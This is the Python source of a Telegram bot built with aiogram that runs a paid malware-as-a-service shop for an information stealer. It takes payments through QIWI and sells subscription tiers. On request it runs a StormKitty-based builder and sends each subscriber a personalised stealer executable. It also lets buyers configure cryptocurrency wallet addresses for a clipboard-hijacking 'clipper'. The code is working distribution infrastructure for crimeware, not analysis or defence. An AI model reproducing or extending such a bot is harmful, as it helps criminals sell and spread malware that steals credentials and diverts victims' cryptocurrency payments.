from aiogram import types
import datetime
import os
import time
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.utils.callback_data import CallbackData

from src.config import dp, api, storage, p2p
from src import db_ustils
# from src.buttons.default_user import user_kb
from src.buttons.user_panel import user_keyboard as userbtn
from src.models import users
from aiogram.types import ReplyKeyboardRemove, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, \
    InlineKeyboardButton, CallbackQuery

import random

btc_wallets = CallbackData("wallet", "wallet_type")
wallets_add = CallbackData("payment", "wallet_pay")
CHANEL_ID = "@deepsidenews"
NOTSUB_MESSAGE = "–î–ª—è –¥–æ—Å—Ç—É–ø–∞ –ø–æ–¥–ø–∏—à–∏—Ç–µ—Å—å –Ω–∞ –∫–∞–Ω–∞–ª https://t.me/deepsidenews"

def check_sub_chanel(chat_member):
    print(chat_member["status"])
    if chat_member["status"] !="left":
        return True
    else:
        return False

@dp.message_handler(commands=["start"])
async def default_start_handler(message: types.Message):
    if check_sub_chanel(await api.get_chat_member(chat_id=CHANEL_ID,user_id=message.from_user.id)):
        await api.send_sticker(chat_id=message.from_user.id,
                               sticker=r"CAACAgQAAxkBAAEF52tjLJ_WAAEL0sjoL-aoNjNIMpxduNwAAp8RAAKm8XEee8GFA8n5UiEpBA")
        await message.answer(f"üíÉ–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!üíÉ {message.from_user.full_name}", reply_markup=userbtn.kb_client)

        await db_ustils.add_user(message.from_user.id)
        # print(message) #–ø—Ä–∏–Ω—Ç–∏—Ç –∏–Ω—Ñ—É –æ–± –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª–µ
    else:
        await api.send_message(message.from_user.id, NOTSUB_MESSAGE)



def time_sub_days(get_time):
    time_now = int(time.time())
    middle_time = int(get_time) - time_now
    if middle_time <= 0:
        return False
    else:
        dt = str(datetime.timedelta(seconds=middle_time))
        return dt

@dp.message_handler(text="–ü—Ä–æ—Ñ–∏–ª—å")
async def bot_message(message: types.Message):
    buttons = types.InlineKeyboardMarkup()
    buttons.add(types.InlineKeyboardButton(text="–ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å".upper(), callback_data="add_balance"))
    messages = "\n‚öôÔ∏è–ö–æ–Ω—Ñ–∏–≥:"
    users_ids = await users.get_or_none(telegram_id=message.from_user.id)
    if users_ids:
        seconds_sub = await db_ustils.get_sub_days(message.from_user.id)
        user_sub_in_days = time_sub_days(seconds_sub)
        for key, value in users_ids.config.items():
            messages += f"\n{key} = {value}"
        user_profile_info = f"üíéid: {await db_ustils.get_teleid(message.from_user.id)}\n" \
                            f"‚≠êÔ∏è–ü–æ–¥–ø–∏—Å–∫–∞: {user_sub_in_days} \n" \
                            f"üí∏–ë–∞–ª–∞–Ω—Å: {await db_ustils.get_money_balance(message.from_user.id)} ‚ÇΩ" \
                            f"{messages}\n"
        await api.send_message(message.from_user.id, user_profile_info, reply_markup=buttons)


@dp.callback_query_handler(text="add_balance")
async def add_user_balance(callback: types.CallbackQuery):
    await api.delete_message(callback.from_user.id, callback.message.message_id)
    wallets_addd = ["QIWI", "YOUMONEY", "BTCBANKER"]
    buttons = types.InlineKeyboardMarkup()
    for value in wallets_addd:
        buttons.add(
            types.InlineKeyboardButton(text=value.upper(), callback_data=wallets_add.new(wallet_pay=value)))
    await api.send_message(callback.from_user.id, "–í—ã–±–µ—Ä–∏—Ç–µ —Å–ø–æ—Å–æ–± –æ–ø–ª–∞—Ç—ã", reply_markup=buttons)


@dp.callback_query_handler(wallets_add.filter(wallet_pay="QIWI"))
async def name(context: types.callback_query, callback_data: dict):
    await context.message.answer(f'–ù–∞–ø–∏—à–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è —á–µ—Ä–µ–∑ {callback_data["wallet_pay"].upper()}')

    await ProfileStatesGroup.pay_wallet.set()
    state = dp.current_state(user=context.from_user.id)
    await state.update_data(key=callback_data["wallet_pay"])


###FSM Machine
class ProfileStatesGroup(StatesGroup):
    walletAddres = State()
    pay_wallet = State()


@dp.message_handler(state=ProfileStatesGroup.pay_wallet)
async def new_event_from_pay_state(message: types.Message, state: FSMContext):
    async with state.proxy() as storage:
        print(storage)
        if message.text.isdigit():
            match storage["key"]:
                case "QIWI":
                    comment = "schoolpirates" + "_" + str(random.randint(1000, 9999))
                    bill = p2p.bill(amount=message.text, lifetime=15, comment=comment)
                    await db_ustils.add_check(message.from_user.id, bill.bill_id, message.text)
                    await state.finish()
                    await message.answer(
                        f"–í–∞—à–∞ —Å—Å—ã–ª–∫–∞ –Ω–∞ –æ–ø–ª–∞—Ç—É –≥–æ—Ç–æ–≤–∞, —É –≤–∞—Å –µ—Å—Ç—å 15 –º–∏–Ω—É—Ç –Ω–∞ –æ–ø–ª–∞—Ç—É. –°—É–º–º–∞: {message.text}\n–°—Å—ã–ª–∫–∞:{bill.pay_url}",
                        reply_markup=userbtn.buy_menu(url=bill.pay_url, bill=bill.bill_id))
                case "YOUMONEY":
                    ...
                case "BTCBANKER":
                    ...
        else:
            await message.answer("–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ!")


# qiwi oplata callback for check contains "check_"
@dp.callback_query_handler(text_contains="check_")
async def check(callback: types.CallbackQuery):
    bill = str(callback.data[6:])
    info = await db_ustils.get_check(bill)
    money_in_check = await db_ustils.get_money_in_check(bill)
    if info != False:
        if str(p2p.check(bill_id=bill).status) == "PAID":
            await api.send_message(callback.from_user.id, "–°—á–µ—Ç –æ–ø–ª–∞—á–µ–Ω! –Ω–∞–ø–∏—à–∏—Ç–µ /start\n")
            user_money = await db_ustils.get_money_balance(callback.from_user.id)
            print("user_money:" + user_money)
            print("money in check" + str(money_in_check))
            await db_ustils.add_balance(callback.from_user.id, money_in_check)
            print("add_balance")

        else:
            await api.send_message(callback.from_user.id, "–í—ã –Ω–µ –æ–ø–ª–∞—Ç–∏–ª–∏ —Å—á–µ—Ç",
                                   reply_markup=userbtn.buy_menu(False, bill))
    else:
        await api.send_message(callback.from_user.id, "–°—á–µ—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω")


@dp.message_handler(state=ProfileStatesGroup.walletAddres)
async def new_event_from_state(message: types.Message, state: FSMContext):
    async with state.proxy() as storage:
        users_ids = await users.get_or_none(telegram_id=message.from_user.id)
        if users_ids:
            users_ids.config[storage["key"]] = message.text
            await message.answer("–£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ!")
            await users_ids.save()
            await state.finish()


@dp.callback_query_handler(btc_wallets.filter())
async def name(context: types.callback_query, callback_data: dict):
    await context.message.answer(f'–ù–∞–ø–∏—à–∏—Ç–µ –Ω–æ–≤—ã–π –∫–ª—é—á –¥–ª—è {callback_data["wallet_type"].upper()}')
    await ProfileStatesGroup.walletAddres.set()
    state = dp.current_state(user=context.from_user.id)
    await state.update_data(key=callback_data["wallet_type"])


@dp.message_handler(text="–ù–∞—Å—Ç—Ä–æ–π–∫–∞")
async def nastr_message(message: types.Message):
    buttons = types.InlineKeyboardMarkup()
    users_ids = await users.get_or_none(telegram_id=message.from_user.id)
    if users_ids:
        for key, value in users_ids.config.items():
            if (key != "chat_id"):
                buttons.add(
                    types.InlineKeyboardButton(text=key.upper(), callback_data=btc_wallets.new(wallet_type=key)))

        await message.answer("–í—ã–±–µ—Ä–∏—Ç–µ –ø–∞—Ä–∞–º–µ—Ç—Ä –¥–ª—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∏", reply_markup=buttons)


@dp.message_handler(text="–°—Ç–∏–ª–ª–µ—Ä")
async def stealer_functional(message: types.Message):
    users_ids = await users.get_or_none(telegram_id=message.from_user.id)
    if users_ids:
        if users_ids.sub_day > 0:
            buttons = types.InlineKeyboardMarkup()
            buttons.add(types.InlineKeyboardButton(text="–°–≥–µ–Ω–∏—Ä–∏—Ä–æ–≤–∞—Ç—å –±–∏–ª–¥", callback_data="gen_build"))
            buttons.add(types.InlineKeyboardButton(text="–ö—Ä–∏–ø—Ç–æ–≤–∞—Ç—å –±–∏–ª–¥", callback_data="crypt_build"))
            await message.answer("–í—ã–±–µ—Ä–∏—Ç–µ –ø–∞—Ä–∞–º–µ—Ç—Ä", reply_markup=buttons)
        else:
            await message.answer("–£ –≤–∞—Å –Ω–µ—Ç –ø–æ–¥–ø–∏—Å–∫–∏!")


@dp.callback_query_handler(text="gen_build")
async def gen_build(callback: types.CallbackQuery):
    await callback.message.answer("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –±–∏–ª–¥–∞...")
    os.system(
        f"C:\\Users\\nikitageak\\Desktop\\stealer\\builder\\StormKittyBuilder\\bin\\Release\\deepsidebuilder.exe {callback.from_user.id}")
    with open(
            f"C:\\Users\\nikitageak\\Desktop\\stealer\\builder\\StormKittyBuilder\\bin\\Release\\stub\\{callback.from_user.id}.exe",
            "rb") as builded_exe:
        await callback.message.answer_document(document=builded_exe, caption="–î–µ—Ä–∂–∏ —Å–≤–æ–π –±–∏–ª–¥. ")


@dp.message_handler(text="–ü–æ–¥–¥–µ—Ä–∂–∫–∞")
async def support_contactic(message: types.Message):
    await message.answer("Admin: @reverse1337 \nSupport: -\n\n–ü–µ—Ä–µ–¥ —Ç–µ–º –∫–∞–∫ –Ω–∞–ø–∏—Å–∞—Ç—å –º–Ω–µ –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ FAQ")

@dp.message_handler(text="FAQ")
async def faqyou(message: types.Message):
    await message.answer(
        "üî•–ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É—é –≤ —Å—Ç–∏–ª–ª–µ—Ä–µ @schoolpirateüî•\n1)–ß—Ç–æ-–±—ã –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Å—Ç–∏–ª–ª–µ—Ä–æ–º –Ω—É–∂–Ω–æ –ø–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å –≤ –ø—Ä–æ—Ñ–∏–ª–µ, –∑–∞–π—Ç–∏ –≤ @–ö—É–ø–∏—Ç—å  –∏ –ø—Ä–∏–æ–±—Ä–µ—Å—Ç–∏ –ø–æ–¥–ø–∏—Å–∫—É .\n2)‚ùì–ï—Å–ª–∏ –≤–æ–∑–Ω–∏–∫–Ω—É—Ç –≤–æ–ø—Ä–æ—Å—ã –ø–∏—à–∏—Ç–µ –∏—Ö –∞–¥–µ–∫–≤–∞—Ç–Ω–æ –∏ —Å—Ç—Ä—É–∫—Ç—É—Ä–∏—Ä–æ–≤–∞–Ω–Ω–æ –±–µ–∑ (–Ω—É, —Ç–∞–º, –∫–∞–∫-–±—ã, –ø–∞–º–∞–≥–∏—Ç–µ)\n3)‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π—Ç–µ –≤–∞—à –∫–æ–Ω—Ñ–∏–≥ –¥–ª—è —Å—Ç–∏–ª–ª–µ—Ä–∞ –≤ –∫–Ω–æ–ø–∫–µ @–ù–∞—Å—Ç—Ä–æ–π–∫–∞ -- —Ç–∞–º –≤—ã —Å–º–æ–∂–µ—Ç–µ —É–≤–∏–¥–µ—Ç—å —Å–ø–∏—Å–æ–∫ –∫–æ—à–µ–ª—å–∫–æ–≤ –¥–ª—è –∫–ª–∏–ø–ø–µ—Ä–∞ –≤ —Å—Ç–∏–ª–ª–µ—Ä–µ(–∫–ª–∏–ø–ø–µ—Ä -  Õü–≤Õü—ÄÕü–µÕü–¥Õü–æÕü–ΩÕü–æÕü—ÅÕü–ΩÕü–∞Õü—èÕü Õü–øÕü—ÄÕü–æÕü–≥Õü—ÄÕü–∞Õü–ºÕü–ºÕü–∞Õü,Õü Õü–∫Õü–æÕü—ÇÕü–æÕü—ÄÕü–∞Õü—èÕü Õü–ºÕü–æÕü–ΩÕü–∏Õü—ÇÕü–æÕü—ÄÕü–∏Õü—ÇÕü Õü–±Õü—ÉÕü—ÑÕü–µÕü—ÄÕü Õü–æÕü–±Õü–ºÕü–µÕü–ΩÕü–∞Õü Õü–ΩÕü–∞Õü Õü–ΩÕü–∞Õü–ªÕü–∏Õü—áÕü–∏Õü–µÕü Õü–∫Õü–∞Õü–∫Õü–∏Õü—ÖÕü-Õü–ªÕü–∏Õü–±Õü–æÕü Õü–¥Õü–∞Õü–ΩÕü–ΩÕü—ãÕü—ÖÕü,Õü Õü–∏Õü,Õü Õü–≤Õü Õü—ÅÕü–ªÕü—ÉÕü—áÕü–∞Õü–µÕü Õü–∏Õü—ÖÕü Õü–ΩÕü–∞Õü—ÖÕü–æÕü–∂Õü–¥Õü–µÕü–ΩÕü–∏Õü—èÕü,Õü Õü–∑Õü–∞Õü–ºÕü–µÕü–ΩÕü—èÕü–µÕü—ÇÕü Õü–ΩÕü–∞Õü Õü—ÉÕü–∫Õü–∞Õü–∑Õü–∞Õü–ΩÕü–ΩÕü—ãÕü–µÕü.ÕüÕüÕü)\n\n–ê–∫—Ç—É–∞–ª—å–Ω—ã–π –ø—Ä–∞–π—Å:\n2 –º–µ—Å—è—Ü–∞ - 300—Ä—É–±.\n–ì–æ–¥ - 1400—Ä—É–±.\n–ù–∞–≤—Å–µ–≥–¥–∞ - 3400—Ä—É–±.")

@dp.message_handler(text="–ö—É–ø–∏—Ç—å")
async def buy_subscribe(message: types.Message):
    buttons = types.InlineKeyboardMarkup()
    buttons.add(types.InlineKeyboardButton(text="2 –º–µ—Å—è—Ü–∞ (300 —Ä—É–±.)", callback_data="tow_month_sub")) #300
    buttons.add(types.InlineKeyboardButton(text="–ì–æ–¥ (1400 —Ä—É–±.)", callback_data="one_year")) #1400
    buttons.add(types.InlineKeyboardButton(text="–ù–∞–≤—Å–µ–≥–¥–∞ (3400 —Ä—É–±.)", callback_data="forever_sub")) #3400
    await message.answer("–í—ã–±–µ—Ä–∏—Ç–µ —Å—Ä–æ–∫ –ø–æ–¥–ø–∏—Å–∫–∏", reply_markup=buttons)

def days_to_seconds(days):
    return days * 24 * 60 * 60

@dp.callback_query_handler(text="tow_month_sub")
async def month_sub(callback: types.CallbackQuery):
    time_sub = int(time.time()) + days_to_seconds(60)
    users_ids = await users.get_or_none(telegram_id=callback.from_user.id)
    if users_ids:
        if users_ids.money >= 300:
            await db_ustils.add_sub_days(callback.from_user.id, time_sub, 300)
            await api.send_message(callback.from_user.id, "–í–∞–º –≤—ã–¥–∞–Ω–∞ –ø–æ–¥–ø–∏—Å–∫–∞ –Ω–∞ 2 –º–µ—Å—è—Ü–∞!")
        else:
            await api.send_message(callback.from_user.id, "–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–µ–Ω–µ–≥ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ")

@dp.callback_query_handler(text="one_year")
async def month_sub(callback: types.CallbackQuery):
    time_sub = int(time.time()) + days_to_seconds(365)
    users_ids = await users.get_or_none(telegram_id=callback.from_user.id)
    if users_ids:
        if users_ids.money >= 1400:
            await db_ustils.add_sub_days(callback.from_user.id, time_sub, 1400)
            await api.send_message(callback.from_user.id, "–í–∞–º –≤—ã–¥–∞–Ω–∞ –ø–æ–¥–ø–∏—Å–∫–∞ –Ω–∞ 2 –º–µ—Å—è—Ü–∞!")
        else:
            await api.send_message(callback.from_user.id, "–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–µ–Ω–µ–≥ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ")


@dp.callback_query_handler(text="forever_sub")
async def month_sub(callback: types.CallbackQuery):
    time_sub = int(time.time()) + days_to_seconds(9999)
    users_ids = await users.get_or_none(telegram_id=callback.from_user.id)
    if users_ids:
        if users_ids.money >= 3400:
            await db_ustils.add_sub_days(callback.from_user.id, time_sub, 3400)
            await api.send_message(callback.from_user.id, "–í–∞–º –≤—ã–¥–∞–Ω–∞ –ø–æ–¥–ø–∏—Å–∫–∞ –Ω–∞ 2 –º–µ—Å—è—Ü–∞!")
        else:
            await api.send_message(callback.from_user.id, "–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–µ–Ω–µ–≥ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ")
